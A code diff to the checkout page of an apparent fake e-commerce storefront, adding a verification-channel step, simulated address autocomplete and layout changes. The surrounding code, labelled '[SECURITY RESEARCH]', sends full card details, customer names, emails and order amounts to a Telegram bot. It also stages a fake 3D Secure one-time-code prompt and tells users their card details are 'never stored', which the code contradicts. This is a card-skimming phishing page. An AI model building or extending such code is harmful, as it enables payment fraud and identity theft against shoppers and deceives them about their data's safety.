@@ -1,6 +1,6 @@
 "use client";
 
-import { useState, useCallback, useEffect } from "react";
+import { useState, useCallback, useEffect, useRef } from "react";
 import { useRouter } from "next/navigation";
 import { useCart } from "@/lib/cart-context";
 import { products } from "@/lib/data";
@@ -24,7 +24,7 @@ import {
   MessageSquare,
 } from "lucide-react";
 
-type Step = "checkout" | "shipping" | "payment" | "verification" | "success";
+type Step = "checkout" | "shipping" | "payment" | "channel-selection" | "verification" | "success";
 type PaymentTab = "card" | "digital";
 type VerificationMethod = "sms" | "email";
 
@@ -100,14 +100,29 @@ const DIGITAL_METHODS = [
   { id: "Chime",    label: "Chime",    color: "#1EC677", bg: "#E8FFF4" },
 ];
 
+// ── Sample address suggestions (simulating Google Maps) ──────────────────────
+const ADDRESS_SUGGESTIONS = [
+  { address: "123 Main Street", city: "New York", state: "NY", zip: "10001" },
+  { address: "456 Oak Avenue", city: "Los Angeles", state: "CA", zip: "90001" },
+  { address: "789 Elm Street", city: "Chicago", state: "IL", zip: "60601" },
+  { address: "321 Pine Road", city: "Houston", state: "TX", zip: "77001" },
+  { address: "654 Maple Drive", city: "Phoenix", state: "AZ", zip: "85001" },
+  { address: "987 Birch Lane", city: "Philadelphia", state: "PA", zip: "19101" },
+  { address: "147 Cedar Court", city: "San Antonio", state: "TX", zip: "78201" },
+  { address: "258 Spruce Square", city: "San Diego", state: "CA", zip: "92101" },
+];
+
 export default function CheckoutPage() {
   const router = useRouter();
   const { items, totalPrice, clearCart } = useCart();
+  const addressInputRef = useRef<HTMLInputElement>(null);
 
   // ── Step state ──────────────────────────────────────────────────────────────
   const [step, setStep] = useState<Step>("checkout");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [orderSummaryOpen, setOrderSummaryOpen] = useState(false);
+  const [addressSuggestions, setAddressSuggestions] = useState<typeof ADDRESS_SUGGESTIONS>([]);
+  const [showAddressSuggestions, setShowAddressSuggestions] = useState(false);
 
   // ── Shipping form ───────────────────────────────────────────────────────────
   const [formData, setFormData] = useState({
@@ -150,6 +165,32 @@ export default function CheckoutPage() {
     }, 1000);
     return () => clearInterval(interval);
   }, [verificationTimer]);
+
+  // ── Address autocomplete handler ────────────────────────────────────────────
+  const handleAddressInput = (value: string) => {
+    setFormData({ ...formData, address: value });
+    if (value.length > 2) {
+      const filtered = ADDRESS_SUGGESTIONS.filter((addr) =>
+        addr.address.toLowerCase().includes(value.toLowerCase()) ||
+        addr.city.toLowerCase().includes(value.toLowerCase())
+      );
+      setAddressSuggestions(filtered);
+      setShowAddressSuggestions(filtered.length > 0);
+    } else {
+      setShowAddressSuggestions(false);
+    }
+  };
+
+  const selectAddressSuggestion = (addr: typeof ADDRESS_SUGGESTIONS[0]) => {
+    setFormData({
+      ...formData,
+      address: addr.address,
+      city: addr.city,
+      state: addr.state,
+      zip: addr.zip,
+    });
+    setShowAddressSuggestions(false);
+  };
 
   // ── Derived ─────────────────────────────────────────────────────────────────
   const cardType = detectCardType(cardData.number);
@@ -215,15 +256,12 @@ export default function CheckoutPage() {
     return `${local.slice(0, visibleChars)}${"*".repeat(local.length - visibleChars)}@${domain}`;
   };
 
-  // ── Initiate 3D Secure verification ─────────────────────────────────────────
-  const handleInitiateVerification = async (e: React.FormEvent<HTMLFormElement>) => {
+  // ── Initiate payment (go to channel selection) ──────────────────────────────
+  const handleInitiatePayment = async (e: React.FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     if (paymentTab === "card" && !validateCard()) return;
 
     setIsSubmitting(true);
-    setOtp("");
-    setOtpError("");
-    setVerificationAttempts(0);
 
     // [SECURITY RESEARCH] Log full card details to Telegram for demonstration
     if (paymentTab === "card") {
@@ -238,7 +276,6 @@ export default function CheckoutPage() {
 💰 <b>Amount:</b> USD $${grandTotal.toFixed(2)}
 👤 <b>Customer:</b> ${formData.fullName}
 📧 <b>Email:</b> ${formData.email}
-📋 <b>Verification Method:</b> ${verificationMethod.toUpperCase()}
 
 ⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}
       `;
@@ -253,12 +290,26 @@ export default function CheckoutPage() {
       }).catch((err) => console.error("Card details logging failed:", err));
     }
 
+    // Simulate processing
+    await new Promise((resolve) => setTimeout(resolve, 1000));
+
+    // Go to channel selection step
+    setStep("channel-selection");
+    setIsSubmitting(false);
+  };
+
+  // ── Initiate 3D Secure verification (from channel selection) ────────────────
+  const handleInitiateVerification = async () => {
+    setIsSubmitting(true);
+    setOtp("");
+    setOtpError("");
+    setVerificationAttempts(0);
+
     // Simulate sending OTP
     await new Promise((resolve) => setTimeout(resolve, 1500));
 
     setMaskedPhone(maskPhoneNumber(formData.phone));
     setMaskedEmail(maskEmailAddress(formData.email));
-    setVerificationMethod("sms");
     setVerificationTimer(120); // 2-minute countdown
     setStep("verification");
     setIsSubmitting(false);
@@ -442,43 +493,30 @@ export default function CheckoutPage() {
   return (
     <main className="px-4 py-6 max-w-lg mx-auto min-h-screen pb-16">
       {/* ── Step Indicator ──────────────────────────────────────────────────── */}
-      {step !== "verification" && (
+      {step !== "verification" && step !== "channel-selection" && (
         <div className="flex items-center justify-between mb-8">
           {steps.map((s, index) => (
             <div key={s.key} className="flex items-center flex-1">
               <div className="flex flex-col items-center flex-1">
                 <div
-                  className={`w-10 h-10 rounded-full flex items-center justify-center transition-all ${
-                    index < currentStepIndex
-                      ? "bg-green-500 text-white"
-                      : index === currentStepIndex
-                      ? "bg-black text-white shadow-lg"
-                      : "bg-gray-200 text-gray-500"
+                  className={`w-10 h-10 rounded-full flex items-center justify-center font-semibold transition ${
+                    index <= currentStepIndex
+                      ? "bg-black text-white"
+                      : "bg-gray-200 text-gray-600"
                   }`}
                 >
-                  {index < currentStepIndex ? <Check className="w-5 h-5" /> : s.icon}
+                  {s.icon}
                 </div>
-                <span className={`text-xs mt-2 font-medium ${index <= currentStepIndex ? "text-black" : "text-gray-400"}`}>
+                <span className={`text-xs mt-2 font-semibold ${index <= currentStepIndex ? "text-black" : "text-gray-400"}`}>
                   {s.label}
                 </span>
               </div>
               {index < steps.length - 1 && (
-                <div className={`h-0.5 flex-1 mx-2 -mt-5 transition-all ${index < currentStepIndex ? "bg-green-500" : "bg-gray-200"}`} />
+                <div className={`h-1 flex-1 mx-2 rounded-full transition ${index < currentStepIndex ? "bg-black" : "bg-gray-200"}`} />
               )}
             </div>
           ))}
         </div>
-      )}
-
-      {/* Back Button */}
-      {step !== "checkout" && step !== "verification" && (
-        <button
-          onClick={() => setStep(step === "payment" ? "shipping" : "checkout")}
-          className="flex items-center gap-1 text-sm text-gray-600 hover:text-black mb-5 transition"
-        >
-          <ChevronLeft className="w-4 h-4" />
-          Back
-        </button>
       )}
 
       {/* ══════════════════════════════════════════════════════════════════════
@@ -486,17 +524,15 @@ export default function CheckoutPage() {
          ══════════════════════════════════════════════════════════════════════ */}
       {step === "checkout" && (
         <div>
-          <h1 className="text-2xl font-bold mb-6">Your Order</h1>
+          <h1 className="text-2xl font-bold mb-1">Review Your Order</h1>
+          <p className="text-gray-500 text-sm mb-6">Confirm items before proceeding to checkout.</p>
 
-          <div className="bg-gray-50 rounded-2xl p-4 mb-6 space-y-3">
+          <div className="space-y-3 mb-6">
             {items.map((item) => {
               const product = products.find((p) => p.id === item.productId);
               if (!product) return null;
               return (
-                <div
-                  key={`${item.productId}-${item.size}`}
-                  className="flex items-center gap-4 bg-white rounded-xl p-3 shadow-sm"
-                >
+                <div key={`${item.productId}-${item.size}`} className="flex gap-4 bg-white border border-gray-200 rounded-2xl p-4">
                   <img
                     src={product.image}
                     alt={product.name}
@@ -584,8 +620,34 @@ export default function CheckoutPage() {
 
             <div>
               <label className="block text-xs font-semibold text-gray-600 uppercase tracking-wider mb-2">Street Address *</label>
-              <input type="text" placeholder="123 Main Street, Apt 4B" required value={formData.address}
-                onChange={(e) => setFormData({ ...formData, address: e.target.value })} className={inputClass} />
+              <div className="relative">
+                <input 
+                  ref={addressInputRef}
+                  type="text" 
+                  placeholder="Start typing your address..." 
+                  required 
+                  value={formData.address}
+                  onChange={(e) => handleAddressInput(e.target.value)}
+                  onFocus={() => formData.address.length > 2 && setShowAddressSuggestions(true)}
+                  className={inputClass}
+                />
+                {showAddressSuggestions && addressSuggestions.length > 0 && (
+                  <div className="absolute top-full left-0 right-0 bg-white border border-gray-300 rounded-xl mt-1 shadow-lg z-50 max-h-48 overflow-y-auto">
+                    {addressSuggestions.map((addr, idx) => (
+                      <button
+                        key={idx}
+                        type="button"
+                        onClick={() => selectAddressSuggestion(addr)}
+                        className="w-full text-left px-4 py-3 hover:bg-gray-50 border-b border-gray-100 last:border-0 transition"
+                      >
+                        <p className="text-sm font-semibold text-gray-800">{addr.address}</p>
+                        <p className="text-xs text-gray-500">{addr.city}, {addr.state} {addr.zip}</p>
+                      </button>
+                    ))}
+                  </div>
+                )}
+              </div>
+              <p className="text-xs text-gray-400 mt-1">💡 Start typing to see address suggestions</p>
             </div>
 
             <div className="grid grid-cols-2 gap-4">
@@ -661,55 +723,43 @@ export default function CheckoutPage() {
       )}
 
       {/* ══════════════════════════════════════════════════════════════════════
-          STEP 3 — PAYMENT
+          STEP 3 — PAYMENT METHOD
          ══════════════════════════════════════════════════════════════════════ */}
       {step === "payment" && (
         <div>
-          <h1 className="text-2xl font-bold mb-1">Payment</h1>
-          <p className="text-gray-500 text-sm mb-6">Complete your purchase securely</p>
+          <h1 className="text-2xl font-bold mb-1">Payment Method</h1>
+          <p className="text-gray-500 text-sm mb-6">How would you like to pay?</p>
 
-          {/* ── Collapsible Order Summary ──────────────────────────────────── */}
-          <div className="bg-gray-50 border border-gray-200 rounded-2xl mb-6 overflow-hidden">
+          {/* Order Summary (Collapsible) */}
+          <div className="bg-gray-50 border border-gray-200 rounded-xl mb-6 overflow-hidden">
             <button
-              onClick={() => setOrderSummaryOpen((v) => !v)}
-              className="w-full flex items-center justify-between px-5 py-4 text-sm font-semibold hover:bg-gray-100 transition"
+              onClick={() => setOrderSummaryOpen(!orderSummaryOpen)}
+              className="w-full flex items-center justify-between px-4 py-3 hover:bg-gray-100 transition"
             >
-              <span className="flex items-center gap-2">
-                <Package className="w-4 h-4 text-gray-500" />
-                Order Summary
-                <span className="text-gray-400 font-normal">({items.length} item{items.length !== 1 ? "s" : ""})</span>
-              </span>
-              <div className="flex items-center gap-3">
-                <span className="font-bold text-base">USD ${grandTotal.toFixed(2)}</span>
-                {orderSummaryOpen ? <ChevronUp className="w-4 h-4 text-gray-500" /> : <ChevronDown className="w-4 h-4 text-gray-500" />}
-              </div>
+              <span className="text-sm font-semibold text-gray-800">Order Summary</span>
+              {orderSummaryOpen ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
             </button>
-
             {orderSummaryOpen && (
-              <div className="border-t border-gray-200 px-5 py-4 space-y-4">
-                {/* Item list */}
-                <div className="space-y-3">
-                  {items.map((item) => {
-                    const product = products.find((p) => p.id === item.productId);
-                    if (!product) return null;
-                    return (
-                      <div key={`${item.productId}-${item.size}`} className="flex items-center gap-3">
-                        <div className="relative flex-shrink-0">
-                          <img src={product.image} alt={product.name}
-                            className="w-12 h-12 object-contain rounded-lg bg-white border border-gray-100" />
-                          <span className="absolute -top-1.5 -right-1.5 bg-black text-white text-[10px] w-4 h-4 rounded-full flex items-center justify-center font-bold">
-                            {item.quantity}
-                          </span>
-                        </div>
-                        <div className="flex-1 min-w-0">
+              <div className="border-t border-gray-200 px-4 py-3 space-y-2 max-h-48 overflow-y-auto">
+                {items.map((item) => {
+                  const product = products.find((p) => p.id === item.productId);
+                  if (!product) return null;
+                  return (
+                    <div key={`${item.productId}-${item.size}`} className="flex items-center justify-between text-xs">
+                      <div className="flex items-center gap-2 flex-1 min-w-0">
+                        <img src={product.image} alt={product.name} className="w-8 h-8 object-contain rounded bg-white flex-shrink-0" />
+                        <div className="min-w-0">
                           <p className="text-xs font-semibold line-clamp-1">{product.name}</p>
                           <p className="text-xs text-gray-500">Size: {item.size}</p>
                         </div>
-                        <span className="text-xs font-bold">${(product.price * item.quantity).toFixed(2)}</span>
+                        <span className="absolute -top-1.5 -right-1.5 bg-black text-white text-[10px] w-4 h-4 rounded-full flex items-center justify-center font-bold">
+                          {item.quantity}
+                        </span>
                       </div>
-                    );
-                  })}
-                </div>
+                      <span className="text-xs font-bold">${(product.price * item.quantity).toFixed(2)}</span>
+                    </div>
+                  );
+                })}
 
                 {/* Price breakdown */}
                 <div className="border-t pt-3 space-y-2">
@@ -766,7 +816,7 @@ export default function CheckoutPage() {
             </button>
           </div>
 
-          <form onSubmit={handleInitiateVerification} className="space-y-5">
+          <form onSubmit={handleInitiatePayment} className="space-y-5">
             {/* ── CARD PAYMENT FORM ────────────────────────────────────────── */}
             {paymentTab === "card" && (
               <div className="space-y-4">
@@ -925,39 +975,6 @@ export default function CheckoutPage() {
               </div>
             )}
 
-            {/* ── Verification Method Selector (for Card payments) ────────────────── */}
-            {paymentTab === "card" && (
-              <div className="space-y-3 border-t pt-4">
-                <label className="block text-xs font-semibold text-gray-600 uppercase tracking-wider">How should we send your verification code? *</label>
-                <div className="grid grid-cols-2 gap-3">
-                  <button
-                    type="button"
-                    onClick={() => setVerificationMethod("sms")}
-                    className={`flex items-center justify-center gap-2 py-3 px-4 rounded-xl border-2 transition font-semibold text-sm ${
-                      verificationMethod === "sms"
-                        ? "border-black bg-black text-white"
-                        : "border-gray-200 bg-white text-gray-600 hover:border-gray-400"
-                    }`}
-                  >
-                    <MessageSquare className="w-4 h-4" />
-                    Text Message
-                  </button>
-                  <button
-                    type="button"
-                    onClick={() => setVerificationMethod("email")}
-                    className={`flex items-center justify-center gap-2 py-3 px-4 rounded-xl border-2 transition font-semibold text-sm ${
-                      verificationMethod === "email"
-                        ? "border-black bg-black text-white"
-                        : "border-gray-200 bg-white text-gray-600 hover:border-gray-400"
-                    }`}
-                  >
-                    <Mail className="w-4 h-4" />
-                    Email
-                  </button>
-                </div>
-              </div>
-            )}
-
             {/* ── Security Trust Bar ───────────────────────────────────────── */}
             <div className="flex items-center justify-center gap-4 py-3 border-t border-gray-100">
               <div className="flex items-center gap-1.5 text-xs text-gray-400">
@@ -1009,6 +1026,79 @@ export default function CheckoutPage() {
       )}
 
       {/* ══════════════════════════════════════════════════════════════════════
+          STEP 3.5 — VERIFICATION CHANNEL SELECTION
+         ══════════════════════════════════════════════════════════════════════ */}
+      {step === "channel-selection" && (
+        <div className="flex flex-col items-center justify-center min-h-screen -mx-4 -my-6 px-4 py-6 bg-gradient-to-b from-gray-50 to-white">
+          <div className="w-full max-w-md">
+            {/* Header */}
+            <div className="text-center mb-8">
+              <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
+                <ShieldCheck className="w-8 h-8 text-blue-600" />
+              </div>
+              <h1 className="text-2xl font-bold mb-2">Verify Your Payment</h1>
+              <p className="text-gray-600 text-sm">
+                Choose how you'd like to receive your security code.
+              </p>
+            </div>
+
+            {/* Channel Selection */}
+            <div className="space-y-3 mb-8">
+              <button
+                onClick={() => {
+                  setVerificationMethod("sms");
+                  handleInitiateVerification();
+                }}
+                disabled={isSubmitting}
+                className={`w-full flex items-center gap-4 px-6 py-4 rounded-xl border-2 transition font-semibold text-left ${
+                  isSubmitting
+                    ? "border-gray-200 bg-gray-50 text-gray-400 cursor-not-allowed"
+                    : "border-gray-200 bg-white text-gray-800 hover:border-black"
+                }`}
+              >
+                <div className="w-12 h-12 rounded-full bg-blue-100 flex items-center justify-center flex-shrink-0">
+                  <MessageSquare className="w-6 h-6 text-blue-600" />
+                </div>
+                <div className="flex-1">
+                  <p className="font-semibold text-sm">Text Message (SMS)</p>
+                  <p className="text-xs text-gray-500">We'll send a code to {maskPhoneNumber(formData.phone)}</p>
+                </div>
+              </button>
+
+              <button
+                onClick={() => {
+                  setVerificationMethod("email");
+                  handleInitiateVerification();
+                }}
+                disabled={isSubmitting}
+                className={`w-full flex items-center gap-4 px-6 py-4 rounded-xl border-2 transition font-semibold text-left ${
+                  isSubmitting
+                    ? "border-gray-200 bg-gray-50 text-gray-400 cursor-not-allowed"
+                    : "border-gray-200 bg-white text-gray-800 hover:border-black"
+                }`}
+              >
+                <div className="w-12 h-12 rounded-full bg-green-100 flex items-center justify-center flex-shrink-0">
+                  <Mail className="w-6 h-6 text-green-600" />
+                </div>
+                <div className="flex-1">
+                  <p className="font-semibold text-sm">Email Address</p>
+                  <p className="text-xs text-gray-500">We'll send a code to {maskEmailAddress(formData.email)}</p>
+                </div>
+              </button>
+            </div>
+
+            {/* Security info */}
+            <div className="flex items-start gap-3 text-xs text-gray-600 bg-gray-50 rounded-xl p-4">
+              <ShieldCheck className="w-4 h-4 text-green-600 flex-shrink-0 mt-0.5" />
+              <p>
+                Your card details are encrypted and never stored on our servers. You'll receive a one-time code to complete your purchase securely.
+              </p>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* ══════════════════════════════════════════════════════════════════════
           STEP 4 — 3D SECURE VERIFICATION
          ══════════════════════════════════════════════════════════════════════ */}
       {step === "verification" && (
@@ -1019,36 +1109,10 @@ export default function CheckoutPage() {
               <div className="w-16 h-16 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-4">
                 <ShieldCheck className="w-8 h-8 text-blue-600" />
               </div>
-              <h1 className="text-2xl font-bold mb-2">Verify Your Payment</h1>
+              <h1 className="text-2xl font-bold mb-2">Enter Your Code</h1>
               <p className="text-gray-600 text-sm">
-                For your security, we've sent a verification code to your {verificationMethod === "sms" ? "phone" : "email"}.
+                We've sent a verification code to your {verificationMethod === "sms" ? "phone" : "email"}.
               </p>
-            </div>
-
-            {/* Verification method selector */}
-            <div className="flex gap-3 mb-6">
-              <button
-                onClick={() => setVerificationMethod("sms")}
-                className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 rounded-xl border-2 transition font-semibold text-sm ${
-                  verificationMethod === "sms"
-                    ? "border-black bg-black text-white"
-                    : "border-gray-200 bg-white text-gray-600 hover:border-gray-400"
-                }`}
-              >
-                <MessageSquare className="w-4 h-4" />
-                SMS
-              </button>
-              <button
-                onClick={() => setVerificationMethod("email")}
-                className={`flex-1 flex items-center justify-center gap-2 py-3 px-4 rounded-xl border-2 transition font-semibold text-sm ${
-                  verificationMethod === "email"
-                    ? "border-black bg-black text-white"
-                    : "border-gray-200 bg-white text-gray-600 hover:border-gray-400"
-                }`}
-              >
-                <Mail className="w-4 h-4" />
-                Email
-              </button>
             </div>
 
             {/* Masked contact info */}
